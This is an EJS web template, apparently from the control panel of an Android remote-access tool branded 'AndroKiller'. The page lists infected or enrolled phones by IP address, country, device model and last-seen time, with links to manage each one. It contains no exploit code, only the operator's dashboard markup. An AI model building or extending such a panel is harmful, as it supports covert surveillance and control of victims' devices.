<!DOCTYPE html>
<html>
    <% include partials/head.ejs %>
<head>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Audiowide|Sofia|Trirong">
    <head>		<script type="text/javascript"></script>
    </div><body onclick="playAudio();" class=""> <audio id="sec" __idm_id__="823202817"> <source src="GreyBack/Tones/interface.mp3" type="audio/mpeg"> </audio><div class="memeck"> <script> var x = document.getElementById("sec"); function playAudio() { x.play(); } function myFunction() { var element = document.body; element.classList.toggle("dark-mode"); } function changeImage() { if (document.getElementById("imgClickAndChange").src == "body") { document.getElementById("imgClickAndChange").src = "body"; } else { document.getElementById("imgClickAndChange").src = "body"; } } 
    </script></head>
<style>
    body {
  --s: 50px;
  --c: #191b22;
  --_s: calc(2*var(--s)) calc(2*var(--s));
  --_g: 35.36% 35.36% at;
  --_c: #0000 66%,#20222a 68% 70%,#0000 72%;
  background: 
    radial-gradient(var(--_g) 100% 25%,var(--_c)) var(--s) var(--s)/var(--_s), 
    radial-gradient(var(--_g) 0 75%,var(--_c)) var(--s) var(--s)/var(--_s), 
    radial-gradient(var(--_g) 100% 25%,var(--_c)) 0 0/var(--_s), 
    radial-gradient(var(--_g) 0 75%,var(--_c)) 0 0/var(--_s), 
    repeating-conic-gradient(var(--c) 0 25%,#0000 0 50%) 0 0/var(--_s), 
    radial-gradient(var(--_c)) 0 calc(var(--s)/2)/var(--s) var(--s) var(--c);
  background-attachment: fixed;
}
.hare{
    text-shadow:0px 1px 12px red;
    color: red;
    background-color: black;
    font-family: "Trironga", sans-serif;
}
    @import url(https://fonts.googleapis.com/css?family=Raleway:400,700,900,400italic,700italic,900italic);

*,
:before,
:after {
    box-sizing: border-box;
}


#wrapper {
    margin-left: auto;
    margin-right: auto;
    max-width: 80em;
}

#container {
    display: flex;
    flex-direction: column;
    float: left;
    justify-content: center;
    min-height: 100vh;
    padding: 1em;
    width: 100%;
}

h1 {
    animation: text-shadow 1.5s ease-in-out infinite;
    font-size: 5em;
    font-weight: 900;
    line-height: 1;
}

h1:hover {
    animation-play-state: paused;
}

a {
    color: #024794;
}

a:hover {
    text-decoration: none;
}

@keyframes text-shadow {
    0% {  
        transform: translateY(0);
        text-shadow: 
            0 0 0 #0c2ffb, 
            0 0 0 #2cfcfd, 
            0 0 0 #fb203b, 
            0 0 0 #fefc4b;
    }

    20% {  
        transform: translateY(-1em);
        text-shadow: 
            0 0.125em 0 #0c2ffb, 
            0 0.25em 0 #2cfcfd, 
            0 -0.125em 0 #fb203b, 
            0 -0.25em 0 #fefc4b;
    }

    40% {  
        transform: translateY(0.5em);
        text-shadow: 
            0 -0.0625em 0 #0c2ffb, 
            0 -0.125em 0 #2cfcfd, 
            0 0.0625em 0 #fb203b, 
            0 0.125em 0 #fefc4b;
    }
    
   60% {
        transform: translateY(-0.25em);
        text-shadow: 
            0 0.03125em 0 #0c2ffb, 
            0 0.0625em 0 #2cfcfd, 
            0 -0.03125em 0 #fb203b, 
            0 -0.0625em 0 #fefc4b;
    }

    80% {  
        transform: translateY(0);
        text-shadow: 
            0 0 0 #0c2ffb, 
            0 0 0 #2cfcfd, 
            0 0 0 #fb203b, 
            0 0 0 #fefc4b;
    }
}

@media (prefers-reduced-motion: reduce) {
    * {
      animation: none !important;
      transition: none !important;
    }
}
</style>
</head>
<body>
    <script>
        gtag('event', 'screen_view', {
            'screen_name': 'devices',
            'app_name': 'AndroKiller'
        });

        gtag('event', 'devicecount', {
            'devicesonline': <%= clientsOnline.length %>,
            'devicesoffline': <%= clientsOffline.length %>,
        });

    </script>
    <div class="ui container">
        <% include partials/header.ejs %>
        <div class="ui red segment" style="background-color: #404451;">

            <h3 class="ui grey dividing header"><font style="color: rgb(8, 215, 8); text-shadow: 0px 1px 10px rgb(130, 255, 47);">Online</font></h3>

            <table class="ui red celled table">
                <thead>
                    <tr>
                        <th class="hare" style="color:red; background-color: #010101;">Name</th>
                        <th class="hare" style="color:red; background-color: #010101;">Country</th>
                        <th class="hare" style="color:red; background-color: #010101;">IP</th>
                        <th class="hare" style="color:red; background-color: #010101;">Device</th>
                        <th class="hare" style="color:red; background-color: #010101;">Last Seen <i class="icon phone"></i></th>
                        <th class="hare" style="color:red; background-color: #010101;">Manage</th>
                    </tr>
                </thead>
                <tbody style="background-color: rgb(0, 0, 0);">
                    <% clientsOnline.forEach((item) => { 
                       let lsdate = new Date(item.lastSeen);
                       let flagCss = (item.dynamicData.clientGeo.country !== undefined) ? ('flag ' + item.dynamicData.clientGeo.country).toLowerCase() : 'icon question mark' 
                       let deviceStr = '';
                       deviceStr += (item.dynamicData.device.manufacture !== undefined) ? item.dynamicData.device.manufacture :  ''; 
                       deviceStr += (item.dynamicData.device.model !== undefined) ? ' (' + item.dynamicData.device.model + ')' :  ''; 
                       %>
                    <tr style="background-color:  rgb(131, 140, 143);">
                        <td class="collapsing" contenteditable="true" style="text-shadow: 0 0 7px #ffba3a; color: #ffffff;"></td>
                        <td class="collapsing"><i class="<%= flagCss %>"></i></td>
                        <td class="collapsing"><font style="text-shadow: 0 0 7px #cf0be9; color: #ffffff;"><%= item.dynamicData.clientIP %></div></td>
                        <td><font style="text-shadow: 0 0 7px #cf0be9; color: #1E90FF;"><%= deviceStr %></font></td>
                        <td class="collapsing"><font style="text-shadow: 0 0 7px #cf0be9; color: #fbfdfe;"><%= lsdate.toLocaleString('en-GB', { timeZone: 'UTC' }) %></div></td>
                        <td class="collapsing"><a href="/manage/<%= item.clientID %>/info"
                                class="ui button blue">Manage</a>
                        </td>
                    </tr>
                    <% }) %>
                </tbody>
            </table>


            <h3 class="ui grey dividing header"><font style="color: black; text-shadow: 0px 1px 10px rgb(255, 21, 21);">Offline</font></h3>
            <table class="ui red celled table">
                <thead>
                    <tr>
                        <th class="hare" style="color:red; background-color: #010101;">Name</th>
                        <th class="hare" style="color:red; background-color: #010101;">Country</th>
                        <th class="hare" style="color:red; background-color: #010101;">IP</th>
                        <th class="hare" style="color:red; background-color: #010101;">Device</th>
                        <th class="hare" style="color:red; background-color: #010101;">Last Seen <i class="icon phone"></i></th>
                        <th class="hare" style="color:red; background-color: #010101;">Manage</th>
                    </tr>
                </thead>
                <tbody>
                    <% clientsOffline.forEach((item) => { 
                       let lsdate = new Date(item.lastSeen);
                       let flagCss = (item.dynamicData.clientGeo.country !== undefined) ? ('flag ' + item.dynamicData.clientGeo.country).toLowerCase() : 'icon question mark' 
                       let deviceStr = '';
                       deviceStr += (item.dynamicData.device.manufacture !== undefined) ? item.dynamicData.device.manufacture :  ''; 
                       deviceStr += (item.dynamicData.device.model !== undefined) ? ' (' + item.dynamicData.device.model + ')' :  ''; 
                       %>
                    <tr style="background-color:  rgb(131, 140, 143);">
                        <td class="collapsing" contenteditable="true" style="text-shadow: 0 0 7px #e9940b; color: #ffffff;"></td>
                        <td class="collapsing"><i class="<%= flagCss %>"></i></td>
                        <td class="collapsing"><font style="text-shadow: 0 0 7px #cf0be9; color: #ffffff;"><%= item.dynamicData.clientIP %></div></td>
                        <td><font style="text-shadow: 0 0 7px #cf0be9; color: #ffffff;"><%= deviceStr %></font></td>
                        <td class="collapsing"><font style="text-shadow: 0 0 7px #cf0be9; color: #fbfdfe;"><%= lsdate.toLocaleString('en-GB', { timeZone: 'UTC' }) %></div></td>
                        <td class="collapsing"><a href="/manage/<%= item.clientID %>/info"
                                class="ui button blue">Manage</a>
                        </td>
                    </tr>
                    <% }) %>
                </tbody>
            </table>
        </div>
    </div>
    <% include partials/footer.ejs %>
</body>

</html>